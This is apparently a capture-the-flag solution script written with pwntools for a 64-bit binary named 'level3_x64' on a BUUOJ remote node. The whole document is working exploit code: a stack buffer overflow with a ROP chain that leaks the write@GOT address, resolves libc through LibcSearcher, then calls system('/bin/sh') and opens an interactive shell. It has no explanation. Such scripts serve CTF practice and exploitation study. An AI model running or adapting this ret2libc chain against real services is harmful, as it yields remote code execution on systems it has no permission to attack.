from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
p = process('./level3_x64')
p = remote('node5.buuoj.cn',28907)
elf = ELF('./level3_x64')
libc = ELF('/home/linbei/桌面/pwn/libc/ubuntu16-64/libc-2.23.so')

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

#system_addr = libc.symbols['system'] 
#binsh_addr = next(libc.search(b"/bin/sh"))
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = b'b' * 128 + b'a' * 8
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_r15_ret) + p64(write_got) + p64(8) + p64(write_plt) + p64(main_addr)
pause()
p.sendlineafter( b'Input:\n',payload)
pause()
write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(write_addr))
#print(hex(write_got))

lib = LibcSearcher('write',write_addr)
libc_base = write_addr - lib.dump('write')

system_addr = lib.dump('system')
binsh_addr = lib.dump('str_bin_sh')
system_addr = system_addr + libc_base
binsh_addr = binsh_addr + libc_base
payload = b'b' * 128 + b'a' * 8
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) 

p.sendlineafter( b'Input:\n',payload)
#pause()

p.interactive()







